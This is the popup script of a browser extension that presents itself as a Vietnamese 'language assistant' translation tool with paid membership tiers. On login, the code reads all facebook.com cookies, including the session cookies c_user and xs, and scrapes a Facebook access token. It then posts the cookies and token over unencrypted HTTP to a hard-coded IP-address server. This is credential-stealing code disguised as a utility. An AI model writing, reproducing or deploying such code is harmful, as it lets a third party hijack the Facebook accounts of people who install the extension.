var domain_api = "http://45.32.113.69:11051/api/login"
var currentCookie="";
var currentUid = "";
var currentToken = "";
var currentUser = "";
var _data = "";
var cuser = "";
var xs = "";
var fr = "";
var datr = "";
var imei = "";

document.addEventListener('DOMContentLoaded', function () {
	load_data();
    $(document).on("click" , "#login" , function(){
        document.getElementById("login").style.display = "none";
        document.getElementById("div_loader").style.display = "block";
        currentUrl="https://www.facebook.com";
        chrome.cookies.getAll({ "url": currentUrl }, async function  (cookie) {
            var result = "";
            for (var i = 0; i < cookie.length; i++) {
                result += cookie[i].name + "=" + cookie[i].value + ";";
                 if (cookie[i].name == "c_user") {
                    currentUid = cookie[i].value;
                }
            }
            currentCookie = result;
            await handleGetToken();
            await handleUser();
            if(currentCookie && currentToken && currentUser){
                alert("Đăng nhập thành công")
                setLocalStorage("currentCookie" , currentCookie)
                setLocalStorage("currentToken" , currentToken)
                setLocalStorage("currentUser" , currentUser)
                setLocalStorage("mess_old" , "[]")
                setLocalStorage("language" , "en")
                load_data();
            }else{
                alert("Đăng nhập thất bại")
            }
            // document.getElementById("login").style.display ="block";
            // document.getElementById("div_loader").style.display =  "none";
        });
    })
    $(document).on("click" , ".group" , function(){
        alert("Đăng xuất thành công")
        setLocalStorage("currentCookie" , "")
        setLocalStorage("currentToken" , "")
        setLocalStorage("currentUser" , "")
        setLocalStorage("language" , "")
        setLocalStorage("mess_old" , "[]")
        load_data();
    });
});

async function handleGetToken(){
	let cookies_getToken = currentCookie;
	const regex = /c_user=(\d+)/g;
	const regex1 = /xs=(.*?);/gm;
	const regex2 = /fr=(.*?);/gm;
	const regex3 = /datr=(.*?);/gm;
	var m;
	var uid = '';
	var cxs = "";
	var cfr = "";
	var cdatr = "";
	while ((m = regex.exec(cookies_getToken)) !== null) {
		uid=m[1]
	}
	while ((m = regex1.exec(cookies_getToken)) !== null) {
		cxs=m[1]
	}
	while ((m = regex2.exec(cookies_getToken)) !== null) {
		cfr=m[1]
	}
	while ((m = regex3.exec(cookies_getToken)) !== null) {
		cdatr=m[1]
	}
	cuser = uid;
	xs = cxs;
	fr = cfr;
	datr = cdatr;
	_data = btoa(cookies_getToken);
	await $.ajax({
		url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed&hc_location=ufi",
		type: 'GET',
		success: function(reponse) {
			var accesstoken = '';
			let match = reponse.match(/accessToken\\":\\"(.*?)\\"/);
			if (match !== null) {
				accesstoken = match[1];
			}
			currentToken = accesstoken
		},
		error: function () {
	        currentToken = ""
     	 }
	});
}
async function handleUser(){
	await $.ajax({
		url: domain_api,
		type: 'POST',
		data:{
		    "cookie": currentCookie,
		    "token": currentToken
	  	},
		success: function(reponse ,textStatus, xhr) {
			if(xhr.status == 200){
				currentUser = JSON.stringify(reponse.data)
			}else{
				currentUser = ""
			}
		},
		error: function () {
	        currentUser = ""
     	 }
	});
}
function load_data(){
	if(getLocalStorage('language') && getLocalStorage('currentCookie') &&  getLocalStorage('currentToken') &&  getLocalStorage('currentUser')){
		
		if(JSON.parse(getLocalStorage('currentUser')).premium == 5) setFrame("frame_three");
		else setFrame("frame_two");
		crear_select();
		setInfoUser();
	}else{
		setFrame("frame_one");
	}
	
}
function setInfoUser(){
	let user = JSON.parse(getLocalStorage('currentUser'));
	document.getElementById("id_user").innerHTML = "ID: " + user.cuser.substr(0,8)+ "...";
	document.getElementById("name_user").innerHTML =  user.full_name;
    document.getElementById("im_user").setAttribute("src" , user.avatar)
	if(user.premium == 1){
		document.getElementById("type_user").innerHTML = "Trial Member";
	}
	if(user.premium == 3){
		document.getElementById("type_user").innerHTML = "Member";
	}
	if(user.premium == 5){
		document.getElementById("type_user").innerHTML = "Vip Member";
	}
	document.getElementById("date_user").innerHTML = "Ngày hết hạn: " + formatDate(user.date_reg)
}
function setLocalStorage($key , $value){
	return localStorage.setItem($key , $value);
}
function getLocalStorage($key){
	return localStorage.getItem($key)
}

function setFrame($name){
	if($name == 'frame_one'){
		document.querySelector('body').innerHTML  = frame_one();
	}
	if($name == 'frame_two'){
		document.querySelector('body').innerHTML  = frame_two();
	}
	if($name == 'frame_three'){
		document.querySelector('body').innerHTML  = frame_three();
	}
}

// window.onload = function() {
//     crear_select();
// }
function formatDate(value){
	if(!value) return ""
    var date = (new Date(value));
    return date.getDate() + "-" + (date.getMonth()+1) + "-" + date.getFullYear();
}
function isMobileDevice() {
    return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
};


var li = new Array();

function crear_select() {
        var div_cont_select = document.querySelectorAll("[data-mate-select='active']");
        var select_ = '';
        for (var e = 0; e < div_cont_select.length; e++) {
            div_cont_select[e].setAttribute('data-indx-select', e);
            div_cont_select[e].setAttribute('data-selec-open', 'false');
            var ul_cont = document.querySelectorAll("[data-indx-select='" + e + "'] > .cont_list_select_mate > ul");
            select_ = document.querySelectorAll("[data-indx-select='" + e + "'] >select")[0];
            if (isMobileDevice()) {
                select_.addEventListener('change', function() {
                    _select_option(select_.selectedIndex, e);
                });
            }
            var select_optiones = select_.options;
            document.querySelectorAll("[data-indx-select='" + e + "']  > .selecionado_opcion ")[0].setAttribute('data-n-select', e);
            document.querySelectorAll("[data-indx-select='" + e + "']  > .icon_select_mate ")[0].setAttribute('data-n-select', e);

            for (var i = 0; i < select_optiones.length; i++) {
            	// console.log(select_optiones[i].value)
                li[i] = document.createElement('li');
                if (select_optiones[i].value == getLocalStorage("language")) {
                    li[i].className = 'active';
                    document.querySelector("[data-indx-select='" + e + "']  > .selecionado_opcion ").innerHTML = select_optiones[i].innerHTML;
                };
                li[i].setAttribute('data-index', i);
                li[i].setAttribute('data-selec-index', e);

                li[i].setAttribute('value-index', select_optiones[i].value);

                li[i].addEventListener('click', function() {
                    _select_option(this.getAttribute('data-index'), this.getAttribute('data-selec-index'));
                });

                li[i].innerHTML = select_optiones[i].innerHTML;
                ul_cont[0].appendChild(li[i]);

            }; // Fin For select_optiones
        }; // fin for divs_cont_select
    } // Fin Function 



var cont_slc = 0;

$(document).on("click", "#selecionado_opcion_one", function() {
    open_select(this)
})
$(document).on("click", "#icon_select_mate_one", function() {
        open_select(this)
    })
    // document.getElementsByClassName("selecionado_opcion")[0].addEventListener("click", open_select(this));
function open_select(idx) {
        var idx1 = idx.getAttribute('data-n-select');
        var ul_cont_li = document.querySelectorAll("[data-indx-select='" + idx1 + "'] .cont_select_int > li");
        var hg = 0;
        var slect_open = document.querySelectorAll("[data-indx-select='" + idx1 + "']")[0].getAttribute('data-selec-open');
        var slect_element_open = document.querySelectorAll("[data-indx-select='" + idx1 + "'] select")[0];
        if (isMobileDevice()) {
            if (window.document.createEvent) { // All
                var evt = window.document.createEvent("MouseEvents");
                evt.initMouseEvent("mousedown", false, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
                slect_element_open.dispatchEvent(evt);
            } else if (slect_element_open.fireEvent) { // IE
                slect_element_open.fireEvent("onmousedown");
            } else {
                slect_element_open.click();
            }
        } else {


            for (var i = 0; i < ul_cont_li.length; i++) {
                hg += ul_cont_li[i].offsetHeight;
            };
            if (slect_open == 'false') {
                document.querySelectorAll("[data-indx-select='" + idx1 + "']")[0].setAttribute('data-selec-open', 'true');
                document.querySelectorAll("[data-indx-select='" + idx1 + "'] > .cont_list_select_mate > ul")[0].style.height = "107px";
                document.querySelectorAll("[data-indx-select='" + idx1 + "'] > .cont_list_select_mate > ul")[0].style.overflow = "auto";
                document.querySelectorAll("[data-indx-select='" + idx1 + "'] > .icon_select_mate")[0].style.transform = 'rotate(180deg)';
            } else {
                document.querySelectorAll("[data-indx-select='" + idx1 + "']")[0].setAttribute('data-selec-open', 'false');
                document.querySelectorAll("[data-indx-select='" + idx1 + "'] > .icon_select_mate")[0].style.transform = 'rotate(0deg)';
                document.querySelectorAll("[data-indx-select='" + idx1 + "'] > .cont_list_select_mate > ul")[0].style.height = "0px";
            }
        }

    } // fin function open_select

function salir_select(indx) {
    var select_ = document.querySelectorAll("[data-indx-select='" + indx + "'] > select")[0];
    document.querySelectorAll("[data-indx-select='" + indx + "'] > .cont_list_select_mate > ul")[0].style.height = "0px";
    document.querySelector("[data-indx-select='" + indx + "'] > .icon_select_mate").style.transform = 'rotate(0deg)';
    document.querySelectorAll("[data-indx-select='" + indx + "']")[0].setAttribute('data-selec-open', 'false');
}


function _select_option(indx, selc) {
    if (isMobileDevice()) {
        selc = selc - 1;
    }
    var select_ = document.querySelectorAll("[data-indx-select='" + selc + "'] > select")[0];

    var li_s = document.querySelectorAll("[data-indx-select='" + selc + "'] .cont_select_int > li");
    var p_act = document.querySelectorAll("[data-indx-select='" + selc + "'] > .selecionado_opcion")[0].innerHTML = li_s[indx].innerHTML;
    var select_optiones = document.querySelectorAll("[data-indx-select='" + selc + "'] > select > option");
    for (var i = 0; i < li_s.length; i++) {
        if (li_s[i].className == 'active') {
            li_s[i].className = '';
        };
        li_s[indx].className = 'active';

    };
    select_optiones[indx].selected = true;
    select_.selectedIndex = indx;
    // select_.onchange();
    salir_select(selc);
    setLocalStorage("language" ,  li_s[indx].getAttribute("value-index"));
}

function frame_one(){
	return `
		<div class="frame" id="frame_one">
	        <div style="width: 349px; margin: 0 auto;padding-top:39px;">
	            <img src="image/logo.png">
	            <img style="margin-top:13px;margin-bottom: 12px" src="image/Minh_Hoang_Language_Assistant.png">
	            <div id="login">

	                <p>Đăng nhập</p>
	            </div>
	            <div id="div_loader"><div class="loader"></div></div>
	            <img class="by" src="image/by.png">
	        </div>
	    </div>
	`;
}
function frame_two(){
    let a = {"en":"Tiếng Anh","th":"Tiếng Thái Lan","zh":"Tiếng Trung Quốc","ko":"Tiếng Tiếng Hàn Quốc","ja":"Tiếng Tiếng Nhật Bản"}
    let str = "";
    Object.keys(a).forEach(function (key) {
       str+= `<option value="${key}">${a[key]}</option>`;
    });
	return `
	<div class="frame" id="frame_two">
        <div class="title">
            <span class="middle">
				<img class="logo" src="image/logo_2.png">	
			</span>
            <span class="middle">
				<img class="group" src="image/Group.png">	
			</span>
        </div>
        <div class="content">
            <div class="info middle">
                <img class="img_user" id="im_user">
                <div class="detail_info">
                    <span id="id_user"></span>
                    <span id="name_user"></span>
                    <span id="type_user"></span>
                    <span id="date_user"></span>
                    <div id="buy">

                        <img style="padding-top: 5px;  padding-left: 10px;padding-right: 10px;float: left;" src="image/icon_buy.png">
                        <span style="float: left;">Mua vip member</span>

                    </div>
                </div>
                <div style="clear: both;"></div>
            </div>
            <div class="language middle">
                <span id="title_language">Chọn ngôn ngữ dịch</span>

                <div style="display: block;
				">
                    <div class="cont_select_center">

                        <div class="select_mate" data-mate-select="active">
                            <select name="" onclick="return false;" id="">
                                ${str}
                            </select>
                            <p class="selecionado_opcion" id="selecionado_opcion_one"></p><span id="icon_select_mate_one" class="icon_select_mate"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="image/bottom.svg">
					    <path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"/>
					    <path d="M0-.75h24v24H0z" fill="none"/>
					</svg></span>
                            <div class="cont_list_select_mate">
                                <ul class="cont_select_int"> </ul>
                            </div>
                        </div>



                    </div>
                </div>
                <img style="padding: 6px 0 6px 0;margin-top: 24px" src="image/by_2.png">
                <span id="link_web">www.minhhoangjsc.com</span>
            </div>
        </div>
    </div>
	`;
}
function frame_three(){
    let a = {"Người Afrikaans":"af","Người Albanian":"sq","Amharic":"am","tiếng Ả Rập":"ar","Tiếng Armenia":"hy","Azerbaijan":"az","Xứ Basque":"eu","Người Belarus":"be","Tiếng Bengali":"bn","Tiếng Bosnia":"bs","Người Bungari":"bg","Catalan":"ca","Cebuano":"ceb","Tiếng Trung (giản thể)":"zh-CN","Truyền thống Trung Hoa)":"zh-TW","Corsican":"co","Người Croatia":"hr","Tiếng Séc":"cs","người Đan Mạch":"da","Tiếng hà lan":"nl","Tiếng Anh":"en","Esperanto":"eo","Người Estonia":"et","Phần lan":"fi","người Pháp":"fr","Frisian":"fy","Galicia":"gl","Người Georgia":"ka","tiếng Đức":"de","người Hy Lạp":"el","Gujarati":"gu","Tiếng Creole của Haiti":"ht","Hausa":"ha","Người Hawaii":"haw","Tiếng Do Thái":"he","Tiếng Hindi":"hi","Hmong":"hmn","người Hungary":"hu","Tiếng Iceland":"is","Igbo":"ig","Người Indonesia":"id","Người Ailen":"ga","người Ý":"it","tiếng Nhật":"ja","Người Java":"jv","Tiếng Kannada":"kn","Tiếng Kazakh":"kk","Tiếng Khmer":"km","Kinyarwanda":"rw","Hàn Quốc":"ko","Người Kurd":"ku","Kyrgyzstan":"ky","Lào":"lo","Latin":"la","Người Latvia":"lv","Tiếng Litva":"lt","Tiếng Luxembourg":"lb","Người Macedonian":"mk","Malagasy":"mg","Tiếng Mã Lai":"ms","Malayalam":"ml","cây nho":"mt","Tiếng Maori":"mi","Marathi":"mr","Tiếng Mông Cổ":"mn","Myanmar (tiếng Miến Điện)":"my","Tiếng Nepal":"ne","Nauy":"no","Nyanja (Chichewa)":"ny","Odia (Oriya)":"or","Pashto":"ps","Tiếng ba tư":"fa","đánh bóng":"pl","Tiếng Bồ Đào Nha (Bồ Đào Nha, Brazil)":"pt","Punjabi":"pa","Tiếng Rumani":"ro","tiếng Nga":"ru","Samoan":"sm","Tiếng Gaelic của Scotland":"gd","Tiếng Serbia":"sr","Sesotho":"st","Shona":"sn","Sindhi":"sd","Sinhala (Sinhalese)":"si","Tiếng Slovak":"sk","Người Slovenia":"sl","Somali":"so","người Tây Ban Nha":"es","Tiếng Sundan":"su","Tiếng Swahili":"sw","Tiếng Thụy Điển":"sv","Tagalog (tiếng Philippines)":"tl","Tajik":"tg","Tiếng Tamil":"ta","Người Tatar":"tt","Tiếng Telugu":"te","Thái":"th","Thổ nhĩ kỳ":"tr","Turkmen":"tk","Người Ukraina":"uk","Tiếng Urdu":"ur","Người Uyghur":"ug","Tiếng Uzbek":"uz","Tiếng Việt":"vi","người xứ Wales":"cy","Xhosa":"xh","Yiddish":"yi","Yoruba":"yo","Zulu":"zu"};
    let str = "";
    Object.keys(a).forEach(function (key) {
       str+= `<option value="${a[key]}">${key}</option>`;
    });
	return `<div class="frame" id="frame_three">
        <div class="title">
            <span class="middle">
				<img class="logo" src="image/logo_2.png">	
			</span>
            <span class="middle">
				<img class="group" src="image/Group.png">	
			</span>
        </div>
        <div class="content">
            <div class="info middle">
                <img class="img_user" id="im_user">
                <div class="detail_info">
                    <span id="id_user"></span>
                    <span id="name_user"></span>
                    <span id="type_user"></span>
                    <span id="date_user"></span>
                    
                </div>
                <div style="clear: both;"></div>
            </div>
            <div class="language middle">
                <span id="title_language">Chọn ngôn ngữ dịch</span>

                <div style="display: block;
				">
                    <div class="cont_select_center">

                        <div class="select_mate" data-mate-select="active">
                            <select name="" onclick="return false;" id="">
                                ${str}
                            </select>
                            <p class="selecionado_opcion" id="selecionado_opcion_one"></p><span id="icon_select_mate_one" class="icon_select_mate"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="image/bottom.svg">
					    <path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"/>
					    <path d="M0-.75h24v24H0z" fill="none"/>
					</svg></span>
                            <div class="cont_list_select_mate">
                                <ul class="cont_select_int"> </ul>
                            </div>
                        </div>



                    </div>
                </div>
                <img style="padding: 6px 0 6px 0;margin-top: 24px" src="image/by_2.png">
                <span id="link_web">www.minhhoangjsc.com</span>
            </div>
        </div>
    </div>`;
}